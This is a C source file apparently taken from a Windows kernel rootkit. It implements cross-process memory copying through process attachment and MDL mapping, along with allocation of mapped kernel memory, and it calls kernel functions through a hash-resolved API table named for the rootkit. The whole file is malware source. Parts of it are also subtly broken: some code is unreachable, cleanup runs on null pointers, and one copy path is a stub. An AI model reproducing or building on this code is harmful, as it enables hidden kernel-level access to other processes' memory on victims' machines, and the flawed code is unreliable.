#include "common.h"

/*////////////////////////////////////////////////
//	File: mem.c
//
//	Implementation of memory support routines
//
*/////////////////////////////////////////////////

ULONG __stdcall KiExceptionInfo(IN PEXCEPTION_POINTERS ExceptionPointers,
	IN OUT PLOGICAL ExceptionAddressConfirmed,
	IN OUT PULONG_PTR BadVa)
{
	PEXCEPTION_RECORD ExceptionRecord;

	*ExceptionAddressConfirmed = FALSE;

	ExceptionRecord = ExceptionPointers->ExceptionRecord;

	if ((ExceptionRecord->ExceptionCode == STATUS_ACCESS_VIOLATION) ||
		(ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) ||
		(ExceptionRecord->ExceptionCode == STATUS_IN_PAGE_ERROR))
	{
		if (ExceptionRecord->NumberParameters > 1)
		{
			*ExceptionAddressConfirmed = TRUE;
			*BadVa = ExceptionRecord->ExceptionInformation[1];
		}
	}
	return EXCEPTION_EXECUTE_HANDLER;
}

NTSTATUS __stdcall KiCopyVirtualMemory(IN PEPROCESS Process1,
	IN PVOID Buffer1,
	IN PEPROCESS Process2,
	OUT PVOID Buffer2,
	IN SIZE_T BufferLength,
	IN KPROCESSOR_MODE Mode,
	OUT PSIZE_T ReturnSize)
{
	NTSTATUS st;
	PEPROCESS Process = Process1;

	if (!BufferLength)
		return STATUS_INFO_LENGTH_MISMATCH;

	if (Process1 == g_Hash._IoGetCurrentProcess())
		Process = Process2;

	// Lock the process so we can proceed with the mem copy procedure

	if (!g_Hash._ExAcquireRundownProtection((ULONG_PTR)Process + g_rootkit_dynamic_data.RundownProtect_Offset))
		return STATUS_PROCESS_IS_TERMINATING;

	if (BufferLength > MI_POOL_COPY_BYTES)
	{
		st = MiDoMappedCopy(Process1, Buffer1, Process2, Buffer2, BufferLength, Mode, ReturnSize);
	}
	else
	{
		st = MiDoPoolCopy(Process1, Buffer1, Process2, Buffer2, BufferLength, Mode, ReturnSize);
	}

	// Unlock the process

	g_Hash._ExReleaseRundownProtection((ULONG_PTR)Process + g_rootkit_dynamic_data.RundownProtect_Offset);

	return st;

}

NTSTATUS __stdcall MiDoPoolCopy(IN PEPROCESS Process1,
	IN PVOID Buffer1,
	IN PEPROCESS Process2,
	OUT PVOID Buffer2,
	IN SIZE_T BufferLength,
	IN KPROCESSOR_MODE Mode,
	OUT PSIZE_T ReturnSize)
{
	return STATUS_NOT_SUPPORTED;
}


NTSTATUS __stdcall MiDoMappedCopy(IN PEPROCESS Process1,
	IN PVOID Buffer1,
	IN PEPROCESS Process2,
	OUT PVOID Buffer2,
	IN SIZE_T BufferLength,
	IN KPROCESSOR_MODE Mode,
	OUT PSIZE_T ReturnSize)
{
	ULONG MdlBuffer[(sizeof(MDL) / sizeof(ULONG)) + MI_MAPPED_COPY_PAGES + 1];
	PMDL Mdl = (PMDL)MdlBuffer;
	SIZE_T TotalSize = 0;
	SIZE_T CurrentSize = 0;
	SIZE_T RemainSize = 0;
	volatile BOOLEAN FailProbe = FALSE;
	volatile BOOLEAN PagesLocked = FALSE;
	PVOID Address1 = Buffer1;
	PVOID Address2 = Buffer2;
	volatile PVOID MdlAddress = NULL;
	KAPC_STATE ApcState;
	BOOLEAN ErrorAddress;
	ULONG_PTR BaseAddress;
	NTSTATUS st = STATUS_SUCCESS;

	TotalSize = MI_MAPPED_COPY_PAGES*PAGE_SIZE;
	if (BufferLength <= TotalSize)
		TotalSize = BufferLength;

	CurrentSize = TotalSize;
	RemainSize = BufferLength;

	while (RemainSize > 0)
	{
		if (RemainSize < CurrentSize)
			CurrentSize = RemainSize;

		g_Hash._KeStackAttachProcess((ULONG_PTR)Process1 + g_rootkit_dynamic_data.Pcb, &ApcState);

		__try
		{
			if ((Address1 == Buffer1) && (Mode != KernelMode))
			{
				FailProbe = TRUE;

				MmSecureVirtualMemory(Buffer1, BufferLength, PAGE_READONLY);

				FailProbe = FALSE;
			}

			MmInitializeMdl(Mdl, Address1, CurrentSize);
			g_Hash._MmProbeAndLockPages(Mdl, Mode, IoReadAccess);
			PagesLocked = TRUE;

		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			st = GetExceptionCode();
		}

		g_Hash._KeUnstackDetachProcess(&ApcState);

		if (st != STATUS_SUCCESS)
			goto exit;

		MdlAddress = g_Hash._MmMapLockedPagesSpecifyCache(Mdl, KernelMode, MmCached, NULL, FALSE, HighPagePriority);
		if (MdlAddress == NULL)
		{
			return STATUS_INSUFFICIENT_RESOURCES;
			goto exit;
		}

		g_Hash._KeStackAttachProcess((ULONG_PTR)Process2 + g_rootkit_dynamic_data.Pcb, &ApcState);

		__try
		{
			if ((Address2 == Buffer2) && (Mode != KernelMode))
			{
				FailProbe = TRUE;

				MmSecureVirtualMemory(Buffer2, BufferLength, PAGE_READWRITE);

				FailProbe = FALSE;
			}

			// do the actual copy

			kimemcpy(Address2, MdlAddress, CurrentSize);

		}
		__except (KiExceptionInfo(GetExceptionInformation(), &ErrorAddress, &BaseAddress))
		{

			*ReturnSize = BufferLength - RemainSize;

			if (FailProbe)
			{
				st = GetExceptionCode();
			}
			else
			{
				if (ErrorAddress)
				{
					*ReturnSize = BaseAddress - (ULONG_PTR)Buffer1;
				}

				st = STATUS_PARTIAL_COPY;
			}
		}

		g_Hash._KeUnstackDetachProcess(&ApcState);

		if (st != STATUS_SUCCESS)
			goto exit;

		g_Hash._MmUnmapLockedPages(MdlAddress, Mdl);
		MdlAddress = NULL;
		g_Hash._MmUnlockPages(Mdl);
		PagesLocked = FALSE;

		RemainSize -= CurrentSize;
		Address1 = (PVOID)((ULONG_PTR)Address1 + CurrentSize);
		Address2 = (PVOID)((ULONG_PTR)Address2 + CurrentSize);
	}

exit:
	if (MdlAddress != NULL)
		g_Hash._MmUnmapLockedPages(MdlAddress, NULL);
	if (PagesLocked)
		g_Hash._MmUnlockPages(Mdl);

	if (st == STATUS_SUCCESS)
		*ReturnSize = BufferLength;

	return st;

}

PVOID __stdcall KiAllocateMappedVirtualMemory(IN ULONG Size, IN ULONG PoolTag, OUT PMDL *MdlAddress, IN PROOTKIT_API_HASH Hash)
{
	PMDL Mdl = NULL;
	PVOID Buffer = NULL;
	PVOID MappedBuffer = NULL;
	PHYSICAL_ADDRESS low, high, skip;

	Buffer = Hash->_MmAllocateMappingAddress((SIZE_T)Size, PoolTag);
	if (Buffer == NULL)
	{
		Hash->_MmFreeMappingAddress(Buffer, PoolTag);
		return NULL;
	}

	low.QuadPart = 0;
	high.QuadPart = 0xFFFFFFFFFFFFFFFF;
	skip.QuadPart = PAGE_SIZE;

	Mdl =Hash->_MmAllocatePagesForMdlEx(low, high, skip, Size, MmCached, MM_ALLOCATE_FULLY_REQUIRED);
	if (Mdl == NULL)
	{
		Hash->_MmFreePagesFromMdl(Mdl);
		return NULL;
	}


	MappedBuffer =Hash->_MmMapLockedPagesWithReservedMapping(Buffer, PoolTag, Mdl, MmCached);
	if (MappedBuffer == NULL)
	{
		Hash->_MmUnmapReservedMapping(MappedBuffer, PoolTag, Mdl);
		return NULL;
	}

	*MdlAddress = Mdl;

	return MappedBuffer;

}

VOID __stdcall KiFreeMappedVirtualMemory(IN PVOID MappedVirtualMemory, IN ULONG PoolTag, IN PMDL Address, IN PROOTKIT_API_HASH Hash)
{
	Hash->_MmUnmapReservedMapping(MappedVirtualMemory,
		PoolTag,
		Address);

	Hash->_MmFreePagesFromMdl(Address);

	Hash->_MmFreeMappingAddress(MappedVirtualMemory,
		PoolTag);
}